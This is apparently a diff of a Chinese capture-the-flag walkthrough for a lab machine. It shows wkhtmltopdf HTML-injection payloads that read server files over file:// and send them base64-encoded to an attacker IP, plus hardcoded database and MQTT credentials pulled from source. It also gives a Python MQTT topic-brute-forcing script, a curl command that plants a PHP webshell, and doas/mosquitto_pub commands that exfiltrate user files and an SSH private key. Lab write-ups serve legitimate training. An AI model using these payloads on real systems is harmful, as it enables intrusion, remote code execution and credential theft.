+为了验证，先用 XSS 读取 `/records/`，看刚才的记录有没有出现：
 
-### 结合之前的records页面，有个下载pdf按钮，是不是当我们点击下载，才会让pdf生成器，进行处理，
-
-**服务器收到 `record` 数据后，不会立刻生成 PDF。**  
-通常，后台还有一个逻辑：把这些数据存起来，等管理员去点“下载 PDF”时，才会把这段数据渲染成 PDF。
-
-### 并且那个records页面从源码可以猜测出是个record主题的订阅历史，这些历史是后端broker发送来的，
-
-### 我们刚才已经把消息发给后端的broker了，现在去看web是否有记录
-
-```bash
+```html
 <img src=x onerror="fetch('/records/').then(r=>r.text()).then(t=>{location.href='http://192.168.56.1:8000?datas='+btoa(encodeURIComponent(t));})" />
 ```
 
 ![](images/2026-10-22-13-04-56-image.png)
 
-#### 有了
+记录出现了。
 
-#### 那就下载看一下会不会触发，
+### 6.4 下载触发渲染
 
-```bash
-
-```
+点击下载，观察是否会触发：
 
 ![](images/2026-10-22-13-51-45-image.png)
 
-### 图片都被生成器渲染了，下载过来了，他就是不向我的服务器请求shell.php
+图片被生成器渲染并下载回来了，但没有向攻击机请求 `shell.php`。官方漏洞示例用的是 `<iframe>`，这里可能受环境影响。
 
-#### 看这个版本的官方漏洞就是用**`<iframe>...<iframe>`**
+换 `<script>` 和其他标签测试：
 
-### 可能环境问题，我们换`<script>...<script>`试试,
-
-```bash
+```jsonc
 "chart": "\"><img src='http://192.168.56.1:8000/test'><x=\""
 ```
 
-```bash
-"chart": "\"><script>fetch('http://192.168.56.1:8000/test')</script>"<x=\""
+```jsonc
+"chart": "\"><script>fetch('http://192.168.56.1:8000/test')</script><x=\""
 ```
 
-#### 全部测试过了，只有img src可以，fetch函数不可以,用XMLHttpRequest代替fetch函数
+测试结果是：只有 `<img src>` 能触发请求，`fetch` 不行。用 `XMLHttpRequest` 代替 `fetch`：
 
 ![](images/2026-10-22-19-23-56-image.png)
 
-#### `\`是用来转译的
+`\` 用于 JSON 字符串转义。Payload 必须闭合 HTML 属性，才能跳出原来的 `<img src="...">`。
 
-#### 目标访问我的服务器了，注意payload一定要闭合html
+### 6.5 闭合 chart 字段
 
-### 后端直接拼接chart,要前后闭合`">...<x="`
+后端直接拼接 `chart`，要闭合 `src` 属性并插入自己的标签：
 
-`$html .= "<img src=" $chart ">"; // 直接把 chart 拼进 src 属性里`
+```php
+$html .= '<img src="' . $chart . '" />';
+```
 
-```bash
+完整一点的拼接逻辑：
+
+```php
 // 1. 接收前端传来的数据
 $data = json_decode($mqtt_message, true);
 $chart = $data['chart'];
 
-// 2. 拼接到 HTML 中（这就是漏洞所在！）
+// 2. 拼接到 HTML 中
 $html = "<html><body>";
-$html .= "<h1>Solar Energy Data</h2>";
-$html .= "<img src=" $chart ">"; // 直接把 chart 拼进 src 属性里
+$html .= "<h1>Solar Energy Data</h1>";
+$html .= '<img src="' . $chart . '" />';
 $html .= "</body></html>";
 
 // 3. 交给 wkhtmltopdf 渲染
@@ -653,43 +737,35 @@ file_put_contents("report.html", $html);
 exec("wkhtmltopdf report.html report.pdf");
 ```
 
-```bash
+Payload 需要让 `src` 属性提前闭合，再插入标签：
+
+```jsonc
+"chart": "\"><img src='http://192.168.56.1:8000/test'><x=\""
+```
+
+- `\">` 先闭合 `src="` 并结束标签。
+- `<img src=...>` 插入新标签。
+- `<x="` 补一个属性，让后面的模板拼接仍然合法。
+
+### 6.6 读取 index.php
+
+读取 `/var/www/solar.nyx/records/index.php` 的 Payload：
+
+```text
 "chart": "\"><script>\np='/var/www/solar.nyx/records/index.php';\nx=new XMLHttpRequest;\nx.onerror=function(){{document.write('<p>'+p+' not found')}};\nx.onload=function(){{document.write('<p>'+p+'</p><div style=\"word-break: break-all;max-width:90%;\">'+btoa(this.responseText)+'</div>')}};\nx.open(\"GET\",\"file://\"+p);x.send();\n</script><x=\""
 ```
 
-#### 这里可以直接外带,`New Image()`不行，一定要用`<img src=...>`
+这个 Payload 把读到的源码写进 PDF 页面。也可以直接外带到攻击机：
 
-## 可能是目标浏览器老旧，不支持现代new Image () API
-
-我们之前测试`"chart": "\"><img src='http://192.168.56.1:8000/test'><x=\""`
-
-是可以让目标访问我的服务器，所以New Image()外带不行，就换之前测试成功的来外带
-
-```
+```text
 "chart": "\"><script>x=new XMLHttpRequest();x.open('GET','file:///var/www/solar.nyx/records/index.php',false);x.send();document.write('<img src=\"http://192.168.56.1:8000/?d='+btoa(x.responseText)+'\">');</script><x=\""
 ```
 
-## 这不行那不行的，通关后我一定要看源码
+这里不能用 `new Image()`，要用 `<img src=...>` 才会触发请求。可能是因为目标浏览器/渲染引擎较老，不支持前者。
 
-#### 下面是作者另一种方式外带源码
+> **另一种思路**：上面的第一个 Payload 就是把源码写进 PDF 页面；如果目标没有外网出口，下载 PDF 即可把数据带回。这就是带外（Out-of-Band）通道。
 
-### 读到的源码渲染成pdf图片，然后再去下载pdf
-
-在真实的实战中，利用 PDF 生成漏洞时，经常遇到这种情况：
-
-- 目标服务器在内网，**没有外网出口**（出不去你的 VPS）。
-
-- 或者服务器配置了严格的防火墙，禁止访问外部 IP。
-
-- 或者纯用 JS 发请求很容易被拦截。
-
-#### **把数据渲染在 PDF 上**，是最稳妥的“带外（Out-of-Band）”通道
-
-```
-"chart": "\"><script>\np='/var/www/solar.nyx/records/index.php';\nx=new XMLHttpRequest;\nx.onerror=function(){{document.write('<p>'+p+' not found')}};\nx.onload=function(){{document.write('<p>'+p+'</p><div style=\"word-break: break-all;max-width:90%;\">'+btoa(this.responseText)+'</div>')}};\nx.open(\"GET\",\"file://\"+p);x.send();\n</script><x=\""
-```
-
-### /var/www/solar.nyx/records/index.php源码
+`/var/www/solar.nyx/records/index.php` 源码较长，重点看顶部的会话校验、`generatePDF()` 和下载分支：
 
 ```php
 <?php
@@ -837,41 +913,27 @@ if (isset($_GET['download']) && isset($_GET['file'])) {
 </html>
 ```
 
-下面源码解释了之前读不到/etc/passwd
+### 6.7 index.php 源码分析
 
-```bash
-$command = escapeshellcmd("wkhtmltopdf --disable-local-file-access --allow /var/www/ $tempHtmlFile $outputPdfFile");
-$result = shell_exec($command . ' 2>&1');
-```
+文件开头先 `include("../session.php")`，并检查 `$_SESSION['role'] == 'admin'`；因此不能匿名访问下载接口。
 
-## 直接拼接chart字段
+**1. `chart` 未经过 HTML 转义，直接进入模板：**
 
 ```php
-$html .= '<div style="text-align:center;"><br><br><img src="/var/www/solar.nyx/sun.svg" width="250" height="150"></div><br><br>';
 $html .= '<h1>Solar Energy Data<br><small>' . htmlspecialchars($data['time']) . '</small></h1><br><br><br><div class="energy-meter"><img src="' . ($data['chart']) . '" /></div><br>';
-$html .= '<table border="0" cellpadding="4" style="margin-left:auto;margin-right:auto;">
 ```
+
+**2. PDF 生成命令限制了本地文件范围：**
 
 ```php
-file_put_contents($tempHtmlFile, $html);
-
-    $outputPdfFile = sys_get_temp_dir() . '/' . $filename;
-    $command = escapeshellcmd("wkhtmltopdf --disable-local-file-access --allow /var/www/ $tempHtmlFile $outputPdfFile");
+$command = escapeshellcmd("wkhtmltopdf --disable-local-file-access --allow /var/www/ $tempHtmlFile $outputPdfFile");
 ```
 
-## 这里把上面从chart和其他字段拿到的数据做成的`$html`,调用`file_put_contents`函数，把`$html`放到`$tempHtmlFile`这个文件里
+`--disable-local-file-access` 关闭默认的本地文件访问，`--allow /var/www/` 只放行 `/var/www/` 下的文件。因此可以读 `/var/www/solar.nyx/records/index.php`，但读不到 `/etc/passwd`。
 
-### 然后wkhtmltopdf这个pdf生成器,用这个`$tempHtmlFile`生成pdf图片
+**3. 之前的路径穿越被 `basename()` 和扩展名检查拦下：**
 
-#### 下面是解释我们前面那个读/etc/passwd失败原因
-
-```bash
-#之前读/etc/passwd的paylod
-<img src=x onerror="fetch('/records/?download=true&file=../../../../../etc/passwd').then(r=>r.text()).then(t=>{location.href='http://192.168.56.1:8000?datas='+btoa(encodeURIComponent(t));})" />
-```
-
-```bash
-#源码
+```php
 if (isset($_GET['download']) && isset($_GET['file'])) {
     $file = basename($_GET['file']);
     $filePath = $directory . '/' . $file;
@@ -879,29 +941,29 @@ if (isset($_GET['download']) && isset($_GET['file'])) {
     if (file_exists($filePath) && pathinfo($filePath, PATHINFO_EXTENSION) === 'json') {
 ```
 
-`basename()` 防住了路径穿越,只读文件名，/etc/passwd,会被处理成passwd,然后去访问当前目录文件，发现没有这个文件，给我们返回404
+`basename('../../../../../etc/passwd')` 的结果是 `passwd`，再到当前目录找 `passwd`，文件不存在，返回 404。并且只允许 `.json` 文件，所以一开始的任意文件读取没有成立。
 
-强制要求 `PATHINFO_EXTENSION === 'json'`，不传 `.json` 结尾它不给你下载
+**4. PDF 只在下载分支生成：**
 
-下面这个说明只允许pdf生成器读`/var/www/` 这个个目录下的文件
-
-```bash
-$command = escapeshellcmd("wkhtmltopdf --disable-local-file-access --allow /var/www/ $tempHtmlFile $outputPdfFile");
-```
+`generatePDF()` 在 `if (isset($_GET['download']) ...)` 内被调用，这解释了为什么只发布 `record` 不会触发渲染。
 
 ![](images/2026-10-23-09-52-04-image.png)
 
-## 从下面可以看出，session.php在上级目录,也就是`/var/www/solar.nyx` ，这个是用来验证前端是否用的admin身份发来的record，我们去读一下这个`session.php`
+### 6.8 读取 session.php
+
+`index.php` 开头 include 了 `../session.php`，它负责会话 Cookie 和 `session_start()`。用同样的方式读取：
 
 ![](images/2026-10-23-09-59-56-image.png)
 
-```bash
-"chart": "\"><script>x=new XMLHttpRequest();x.open('GET','file:///var/www/solar.nyx/sesion.php',false);x.send();document.write('<img src=\"http://192.168.56.1:8000/?d='+btoa(x.responseText)+'\">');</script><x=\""
+```text
+"chart": "\"><script>x=new XMLHttpRequest();x.open('GET','file:///var/www/solar.nyx/session.php',false);x.send();document.write('<img src=\"http://192.168.56.1:8000/?d='+btoa(x.responseText)+'\">');</script><x=\""
 ```
 
-### session.php 源码 ,
+> 原文 Payload 把 `session.php` 写成了 `sesion.php`（少一个 `s`）；上面的命令块已按实际文件名修正，避免照抄后读错文件。
 
-```bash
+`session.php` 源码：
+
+```php
 <?php
 
 $secure = true; // if you only want to receive the cookie over HTTPS
@@ -932,19 +994,31 @@ header("X-Content-Type-Options: nosniff");
 session_start();
 ```
 
-### 回到之前目录扫描的结果，再去读一下login.php
+这段配置涉及三个常见 Cookie 属性：
+
+- **`HttpOnly`**：禁止前端 JS 通过 `document.cookie` 读取 Cookie，只允许浏览器在请求时自动携带。
+- **`Secure`**：Cookie 只能通过 HTTPS 传输，防止在普通 HTTP 下被中间人抓包。
+- **`SameSite=Strict`**：跨站请求不会携带该 Cookie。
+
+这些属性决定了 XSS 能直接拿到哪些数据；本例最终选择外带页面源码。
+
+### 6.9 读取 login.php
+
+回到目录扫描结果，读取 `login.php`：
 
 ![](images/2026-10-23-10-16-48-image.png)
 
-### payload
+Payload（沿用 6.8 的读文件模板，只替换目标路径）：
 
-```bash
-"chart": "\"><script>x=new XMLHttpRequest();x.open('GET','file:///var/www/solar.nyx/sesion.php',false);x.send();document.write('<img src=\"http://192.168.56.1:8000/?d='+btoa(x.responseText)+'\">');</script><x=\""
+```text
+"chart": "\"><script>x=new XMLHttpRequest();x.open('GET','file:///var/www/solar.nyx/login.php',false);x.send();document.write('<img src=\"http://192.168.56.1:8000/?d='+btoa(x.responseText)+'\">');</script><x=\""
 ```
 
-### login.php源码
+> 原文这里沿用了 `sesion.php` 的笔误；上面的路径已改为实际目标 `login.php`，照抄原文会读取失败。
 
-```bash
+`login.php` 源码：
+
+```php
 <?php
 include("session.php");
 
@@ -991,17 +1065,24 @@ $conn = null;
 ?>
 ```
 
-### 直接把凭据硬编码到校验代码里做身份校验
+关键点：
 
-### 内网才能访问这个login.php登录页
+- 数据库账号 `solar_user` / `lD5vkvLfMowAiaT7w64C` 硬编码在源码里。
+- 用户名使用 PDO 预处理，避免了常规 SQL 注入。
+- 密码用 `hash('sha256', $pass)` 比较，未加盐；数据库里存的是 SHA-256。
+- 登录成功后调用 `session_regenerate_id(true)`，并写入 `$_SESSION['role']`。
+
+内网才能访问这个 `login.php` 登录页：
 
 ![](images/2026-10-23-10-20-59-image.png)
 
-## 再读一下,sunfriends.nyx这个域名的/server.php
+### 6.10 读取 server.php
+
+再读 `www.sunfriends.nyx` 的 `/server.php`：
 
 ![](images/2026-10-23-10-28-53-image.png)
 
-### server.php源码
+`server.php` 源码：
 
 ```php
 <?php
@@ -1185,109 +1266,99 @@ if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
 ?>
 ```
 
-## 也是写明文凭据在校验代码里做身份校验
+这份源码同时暴露了：
+
+- 明文凭据 `5up3r` / `bloods`。
+- 命令文件目录 `commands/`。
+- `shell_exec(escapeshellcmd($command['cmd']))` 命令执行。
+- 执行结果通过 `mosquitto_pub` 发到 `server/command/output`。
+
+下一节沿着这条线继续。
+
+> **阶段复盘 · wkhtmltopdf 源码读取**
+>
+> - **目标**：利用 `record` 的 `chart` 字段读取后端源码。
+> - **关键发现**：`chart` 直接拼进 HTML；`basename()` + `.json` 限制挡住路径穿越；`--allow /var/www/` 限定本地文件范围。
+> - **结果**：拿到 `index.php`、`session.php`、`login.php`、`server.php` 及硬编码凭据。
+> - **下一跳**：利用 `server.php` 的命令执行面板与 MQTT 命令队列。
+
+## 7. 第二入口：server.php 与 MQTT 命令队列
+
+### 7.1 server.php 的逻辑
+
+`server.php` 同样把明文凭据写在源码里，登录后是一个命令执行面板：
 
 ![](images/2026-10-23-10-38-35-image.png)
 
-### 但是这个server.php页面我们是可以访问的
+页面可以直接访问：
 
 ![](images/2026-10-23-10-39-09-image.png)
 
-##### 进入后是个命令执行，看systemd的状态信息的，不过只能选择她给的命令，无法自定义输入
+进入后能看到 systemd 状态等信息，但只能从下拉框选择已有命令，无法自定义输入：
 
 ![](images/2026-10-23-10-42-50-image.png)
 
-前端发来文件，提取里面的 `cmd` 字段，然后直接丢给 Linux 系统去执行（`shell_exec`）
+关键逻辑：
 
-**隐藏的 MQTT 通信**  
-执行完命令后，它还会把输出结果打包成 JSON，通过 `mosquitto_pub` 发送到 MQTT 的 `server/command/output` 主题里
+```php
+$commandFile = 'commands/' . basename($_POST['command_file']);
 
-### 下面是分析
-
-```bash
-// 1. 接收用户提交的文件名，并拼接成路径
-$commandFile = 'commands/' . basename($_POST['command_file']); 
-
-// 2. 检查文件是否存在
 if (file_exists($commandFile)) {
-    // 3. 读取这个文件的全部内容
-    $commandJson = file_get_contents($commandFile); 
-    // 4. 把读到的 JSON 字符串解析成 PHP 数组
+    $commandJson = file_get_contents($commandFile);
     $command = json_decode($commandJson, true);
 
-    // 5. 检查数组里有没有 'cmd' 这个键
     if (isset($command['cmd'])) {
-        // 6. 最致命的一步：把 'cmd' 的值交给系统执行！
         $output = shell_exec(escapeshellcmd($command['cmd']));
+        // ...
+    }
+}
 ```
 
-### 
+执行完命令后，它还会把输出打包成 JSON，通过 `mosquitto_pub` 发送到 MQTT 的 `server/command/output` 主题：
 
-### 上面源码表明无法从web端进行命令注入，那就换入口
-
-```bash
-// 1. 准备连接的 MQTT 服务器地址和主题
-$mqttHost = 'localhost';
-$mqttTopic = 'server/command/output';
-
-// 2. 把刚才命令执行的结果，打包成 JSON
+```php
 $mqttMessage = json_encode([
     'name' => $command['name'],
     'command' => $command['cmd'],
-    'output' => base64_encode($output) // 注意这里把输出结果 base64 编码了
+    'output' => base64_encode($output)
 ]);
 
-// 3. 拼接出一段 Linux 命令行字符串
 $mqttCommand = sprintf(
     'mosquitto_pub -h %s -t %s -m %s -u '.$secret['user'].' -P \''.$secret['pass'].'\'',
     escapeshellarg($mqttHost),
     escapeshellarg($mqttTopic),
     escapeshellarg($mqttMessage)
 );
-
-// 4. 再次调用系统命令，执行这段 MQTT 发送命令
 shell_exec($mqttCommand);
 ```
 
-### `mosquitto_pub` 是Linux 下用来发送 MQTT 消息的官方命令行工具
+`mosquitto_pub` 是 Linux 下发送 MQTT 消息的命令行工具。执行结果被 Base64 编码后发到 `server/command/output`：
 
 ![](images/2026-10-23-10-55-54-image.png)
 
-#### 发送到这个主题
-
 ![](images/2026-10-23-10-57-24-image.png)
 
-#### 用这个身份向mqtt的broker发订阅信息的，因为之前用这个身份登录web,然后执行命令，然后将执行结果打包一份，发给mqtt,mqtt需要认证，自然用的这个身份，根据server.php源码上下文可以推测出
+用 `server.php` 的身份连接 Broker，订阅输出主题，就能看到命令结果：
 
 ![](images/2026-10-23-11-12-37-image.png)
 
-### 第二个命令执行入口:
+### 7.2 双端输入猜想与 Topic 爆破
 
-#### 因此，我们可以用这个身份连接mqtt服务端
+Web 端是一个输入端：选择命令文件 → `shell_exec` → 结果发到 `server/command/output`。那么 MQTT 端是否也有一个输入点，收到消息后写命令文件或执行命令？
 
-#### 既然web是个输入端，.php调用系统函数执行，把结果发送到/server/command/output 这个Topic,
+这个输入点需要 Fuzzing。可能的名字包括 `server/command/input`、`input`、`server/np` 等。Web 端用的是 `cmd` 字段，测试 MQTT 时也优先用 `cmd` 传参。
 
-#### 那mqtt客户端是否也有一个输入点，mqtt服务端调用系统函数执行，然后输出到/server/command/output Topic
-
-### 这个输入点就需要进行Fuzzing了
-
-### 可能是server/command/input,也可能是 input 还可能是 server/np,这些Topic
-
-### 需要写脚本批量扫，如果上传到一个存在的Topic，会显示内容的
-
-### 之前看web端是用cmd这个参数来接收命令的，
-
-### 可以试一下mqtt爆破时候用”cmd“字段来传参
-
-## 这里直接看作者答案了，真正处理的Topic是 server/command/new
+实际处理的主题是 `server/command/new`：
 
 ![](images/2026-10-23-11-57-17-image.png)
 
-##### 注意权限隔离，无法用admin的mqtt账号去向server/command/new发送消息
+> **权限隔离**：不能用 admin 的 MQTT 账号向 `server/command/new` 发消息。这里使用的是 `server.php` 里的 `5up3r` / `bloods`。
 
-#### 用ai生成上传内容到Topic的脚本
+### 7.3 Python 批量上传 Topic
 
-```bash
+用 Python 和 `paho-mqtt` 批量向候选 Topic 发布命令：
+
+```python
 import paho.mqtt.client as mqtt
 import ssl
 import json
@@ -1320,7 +1391,7 @@ client.tls_insecure_set(True)
 print("[*] 正在连接靶机...")
 client.connect("www.solar.nyx", 443, 60)
 
-# 💡 关键：启动后台网络循环，否则消息发不出去
+# 关键：启动后台网络循环，否则消息发不出去
 client.loop_start()
 
 print("[*] 开始爆破 Topic...")
@@ -1328,7 +1399,7 @@ for topic in topics:
     print(f"[+] Sending to: {topic}")
     # 3. 将主题变量填入 publish
     client.publish(topic, json_data)
-    # 💡 关键：停顿 0.5 秒，防止发太快被服务器判定为洪水攻击或丢包
+    # 关键：停顿 0.5 秒，防止发太快被服务器判定为洪水攻击或丢包
     time.sleep(0.5)
 
 print("[*] 发送完毕，等待 2 秒让网络把数据彻底传完...")
@@ -1339,117 +1410,107 @@ client.loop_stop()
 print("[+] OK，爆破结束。")
 ```
 
-### 出现订阅的主题了
+> 脚本中的 `name` 字段仍被注释掉，保留了首次尝试的状态；对应 7.4 会先触发“缺少 `name`”的报错，补上字段后再发送。
+
+几个关键参数：
+
+- `transport="websockets"` + `ws_set_options(path="/wss/")`：走 WebSocket。
+- `tls_set(cert_reqs=ssl.CERT_NONE)` + `tls_insecure_set(True)`：忽略自签名证书。
+- `loop_start()`：启动后台网络循环，否则消息发不出去。
+- 每次发布后 `sleep(0.5)`：避免发送过快被丢弃。
+
+### 7.4 第一次尝试：缺少 name 字段
+
+发送后，订阅的主题出现了：
 
 ![](images/2026-10-23-12-27-15-image.png)
 
-### 告诉我们缺少name字段
+服务端提示缺少 `name` 字段：
 
 ![](images/2026-10-23-12-31-06-image.png)
 
-## 第二次没报错也没有出现server/command/output这Topic来回显输出
+补上 `name` 后不再报错，但 `server/command/output` 没有回显。当时推测后台同样调用了 `escapeshellcmd()`：
 
-### 大概是做了过滤吧，下面是server.php的过滤源码，用了escapeshellcmd（）这个函数来过滤，那mqtt也应该用了过滤
-
-```bash
+```php
 $output = shell_exec(escapeshellcmd($command['cmd']));
 ```
 
-#### mqtt服务端本身不具有处理消息的能力，只是个中转站
+MQTT Broker 本身不处理消息，只是中转站。真正处理消息的是服务器上的后台脚本（例如 `daemon.php`）：它订阅主题、提取 JSON 里的 `cmd` 字段，再把命令交给系统执行。这个脚本为了安全，可能也调用了 `escapeshellcmd()`。
 
-- **后台脚本订阅了主题**：服务器上跑着一个 `daemon.php` 或类似的脚本，它一直连着 MQTT Broker，监听 某个 Topic
+`escapeshellcmd()` 的过滤规则大致是：
 
-- **接收并提取**：一收到你发的 JSON，它提取出里面的 `"cmd"` 字段。
+- 允许空格、常规字母和数字。
+- 单引号和双引号在成对时会被保留。
+- 会转义 shell 元字符，但它不是命令白名单。
 
-- **落入同一个陷阱**：这个后台脚本为了安全，在把命令交给系统执行时，也调用了 PHP 的 `escapeshellcmd()` 函数
+所以这里没有输出，不一定是过滤导致，也可能是命令根本没有在 MQTT 端立即执行。后面的实验证明了这一点。
 
-### 猜想后台处理是不是也扔给这个php程序来处理的，那过滤也是用的escapeshellcmd（）
+### 7.5 失败尝试：直接命令执行没有发生
 
-### escapeshellcmd（）过滤规则
+尝试用 `curl` 从攻击机下载 webshell：
 
-- 允许空格**，允许常规的字母和数字**。
-
-- 允许单纯的双引号和单引号
-
-#### 请求个反弹shell
-
-payload 
-
-```bash
+```json
 {
   "name": "fwonowwn",
   "cmd": "curl -o /var/www/solar.nyx/exp.php http://192.168.56.1:8000/shell.php"
 }
 ```
 
-#### 批量发,因为不知道哪个Topic可以被处理
+虽然已经定位到 `server/command/new`，但还不确定它是否会立即执行，于是仍向候选 Topic 批量发送：
 
 ![](images/2026-10-23-13-04-00-image.png)
 
-### `www-data`权限非常低,下载的文件，可能也没权限放在目录
+`www-data` 权限很低，下载的文件不一定能写进 `/var/www/solar.nyx/exp.php`。不过从 `index.php` 的 `glob()` / `unlink()` 逻辑看，`www-data` 对 `/var/www/solar.nyx/records` 有写权限，所以后来把木马放到这个目录。
 
-### 回到刚才的record页面的后端index.php源码, 说明允许www-data用户**随意增删文件**
+> 原文此处写作 `/var/www/solar.php/records`，结合前文 `index.php` 的实际路径，应为 `/var/www/solar.nyx/records`。
 
-```bash
-$files = glob($directory . '*.json');
-usort($files, ...);
-$filesToKeep = array_slice($files, 0, 10);
-$filesToDelete = array_slice($files, 10);
-// 删除旧的 .json 文件
-```
+但在 `server/command/new` 里发送的“请求攻击机”的命令一直没有执行。回到 `server.php` 页面继续观察后，才发现真正的流程不是 MQTT 直接执行命令。
 
-#### 所以需要把木马放在/var/www/solar.php/records
+### 7.6 正确流程：异步命令队列
 
-### 但是上传到/server/command/new里面的请求我的服务器的命令一直不执行，所以我转到了server.php这个页面，并得出以下结论
-
-#### 上面一些推测是错误的，下面是经过实验后的校验，得出正确的推论
-
-### 先把内容上传到server/command/new Topic ，然后web的server.php页面命令执行框，可以选择这个命令文件，点击执行，会向攻击者请求木马，然后执行，最后打印在server/command/output 这个Topic里
+先把内容上传到 `server/command/new` 主题，然后回到 Web 的 `server.php` 页面，在下拉框里选择这个命令文件，点击执行。命令才会运行，结果再发到 `server/command/output`。
 
 ![](images/2026-10-23-13-41-48-image.png)
 
-### 真实攻击中，刚刚发现的现象叫做 **“异步任务队列（Asynchronous Task Queue）”**
+这个现象叫 **异步任务队列（Asynchronous Task Queue）**。如果由有经验的开发者设计，不会让 MQTT 消息直接触发系统命令执行，因为 Broker 一旦被攻破，服务器就会直接失守。
 
-如果是一个有经验的开发人员设计，他**绝对不会**让 MQTT 直接触发系统命令执行，因为那样太危险了（一旦 MQTT 被攻破，服务器直接沦为肉鸡）。
+更合理的设计是：
 
-他的真实设计逻辑是这样的：
+1. **Web 前端或 MQTT 客户端只“提需求”**：收到命令后，只写一个 JSON 配置文件到 `commands/` 目录。
+2. **后台人工审核或定时脚本**：管理面板 `server.php` 读取这个目录，管理员确认后才执行。
 
-1. **web前端或 MQTT客户端 只是“提需求”**：收到命令后，只写一个配置文件（`.json`）放入 `commands/` 目录。
+因此，`server/command/new` 只负责让命令文件存在；真正的执行入口在 `server.php` 页面。这个“审核”步骤在攻防中反而成了可利用的交互点。
 
-2. **后台人工审核（或定时脚本）**：管理面板（`server.php`）读取这个目录，让你确认后再执行。
+### 7.7 上传并访问 Webshell
 
-#### 因此，真正的控制命令执行的后台在server.php页面，server/command/new,只是让那个文件存在，web页面才能出现那个命令的选项，
+把下载 webshell 的命令写入 `server/command/new`：
 
-#### 开始上传反弹木马
-
-![](images/2026-10-23-14-03-50-image.png)
-
-```bash
+```json
 {
   "name": "hacker",
   "cmd": "curl -o /var/www/solar.nyx/records/ppppppp.php http://192.168.56.1:8000/web.php"
 }
 ```
 
-### 出现了
+命令出现在面板中：
+
+![](images/2026-10-23-14-03-50-image.png)
+
+执行后下载成功：
 
 ![](images/2026-10-23-14-08-16-image.png)
 
-#### 成功下载木马
-
 ![](images/2026-10-23-14-09-19-image.png)
 
-## web访问触发,   没有收到shell回连，但是给的ok回显说明存在这个文件的，可能是我们的木马在靶机的环境不行
+访问 webshell 触发，返回了 `ok`，但没有收到 Shell 回连：
 
 ![](images/2026-10-23-14-13-46-image.png)
 
-#### 后来才发现是我的server.py开http服务 这个脚本的问题
+说明文件存在，可能是木马与目标环境不兼容，或者是本地 HTTP 服务的问题。后来发现是 `server.py` 的问题，改用 `python3` 启动 HTTP 服务后成功。
 
-### 那就用python3 开吧
+最终使用的 webshell：
 
-### 终于成功了
-
-```bash
+```php
 <?php system($_GET['code']); ?>
 ```
 
@@ -1457,27 +1518,34 @@ $filesToDelete = array_slice($files, 10);
 
 ![](images/2026-10-23-14-51-48-image.png)
 
-#### 收到了
+> **阶段复盘 · server.php 与 Webshell**
+>
+> - **目标**：利用 `server.php` 的命令执行能力拿到 Web 权限。
+> - **关键发现**：Web 端只能执行 `commands/` 下已有文件；MQTT 的 `server/command/new` 可以写入新的命令文件。
+> - **结果**：上传命令文件 → 在面板点击执行 → 下载 PHP webshell，以 `www-data` 身份执行命令。
+> - **下一跳**：枚举 `doas`，从 `www-data` 横向到普通用户。
 
-#### 目标只有socat,
+## 8. 横向移动：doas 与 MQTT 外带
 
-### 能进用户的目录，但是没有权限访问文件
+### 8.1 www-data 枚举与 doas
 
-#### 有个mysql服务，只允许内网访问，
+拿到 `www-data` 权限后先做基础枚举：
+
+- 目标上有 `socat` 可用。
+- 能进入用户目录，但没有权限读取文件。
+- 有一个只允许内网访问的 MySQL 服务，没有密码登录不上。
 
 ![](images/2026-10-23-15-11-04-image.png)
 
-#### 没有密码登录不上
-
-`/etc/doas.conf` 是 Linux 系统下 `doas` 工具的配置文件。`doas` 是 `sudo` 的一个轻量级替代品（在 OpenBSD 系统里很常见，现在很多精简版 Linux 也在用）。
+`/etc/doas.conf` 是 `doas` 的配置文件。`doas` 是 `sudo` 的轻量级替代品，在 OpenBSD 系统中很常见，精简版 Linux 也常使用。
 
 ![](images/2026-10-23-15-15-54-image.png)
 
 ![](images/2026-10-23-15-21-54-image.png)
 
-#### 把这两个文件用
+### 8.2 用 mosquitto_pub 外带文件
 
-#### /usr/bin/mosquitto_pub 发送到broker的某个主题上，我们去broker 看内容
+`doas` 规则允许以 `lenam` 身份执行 `/usr/bin/mosquitto_pub`。利用 `-f` 参数，可以把本地文件内容作为 MQTT 消息发到 Broker，再从 Broker 读取：
 
 ```bash
 doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/test -f /home/lenam/user.txt
@@ -1487,27 +1555,37 @@ doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/test 
 doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/test -f /home/lenam/note.txt
 ```
 
+参数说明：
+
+- `-L`：用 URI 形式指定 Broker 地址、账号和主题。
+- `-f`：把文件内容作为消息体。
+- `doas -u lenam`：以 `lenam` 身份读取文件，绕过 `www-data` 的权限限制。
+
 ![](images/2026-10-23-15-27-25-image.png)
 
-#### 结合之前爆破出的一个存在主题，或者直接发送到data
-
-看不懂
+把消息发到已知存在的 `test` 主题（也可以发到 `data`），然后在 Broker 客户端查看内容：
 
 ![](images/2026-10-23-15-30-51-image.png)
 
-```bash
+### 8.3 user.txt 与 note.txt 的线索
+
+从 `user.txt` 和 `note.txt` 中拿到：
+
+```text
 c25e7b68dd71d1ca9d8f86da2df12035
 ```
 
-```bash
+```text
 You just have to remember the one that starts with love and ends with a number
 
 你只需要记住那个以 love 开头，并且以数字结尾
 ```
 
-### 这是密码提示
+`note.txt` 是密码提示：口令以 `love` 开头、以数字结尾。
 
-#### 偷私钥
+### 8.4 读取 SSH 私钥
+
+继续用同样的方法外带 `lenam` 的 SSH 私钥：
 
 ```bash
 doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/test -f /home/lenam/.ssh/id_ed25519
@@ -1515,43 +1593,41 @@ doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/test 
 
 ![](images/2026-10-23-15-41-58-image.png)
 
-#### 还要密码短语，大概就是上面给的那串加密字符串
+私钥需要 passphrase。尝试用 `user.txt` 里的字符串：
 
-```
+```text
 c25e7b68dd71d1ca9d8f86da2df12035
 ```
 
 ![](images/2026-10-23-15-46-26-image.png)
 
-#### 上面那个字符串破解不出的，换路
+解不开，换路。
 
-#### 继续用`doas -u lenam /usr/bin/mosquitto_pub -f`去读本地文件，需要写脚本批量读，需要通过回显类型，来判断文件是否存在，进行过滤
+### 8.5 批量读取本地文件
+
+继续用 `doas -u lenam /usr/bin/mosquitto_pub -f` 读取本地文件。需要写脚本批量读，并通过回显类型判断文件是否存在：
 
 ![](images/2026-10-23-19-01-44-image.png)
 
-### 把错误重定向到输出就能用行来判断文件类型
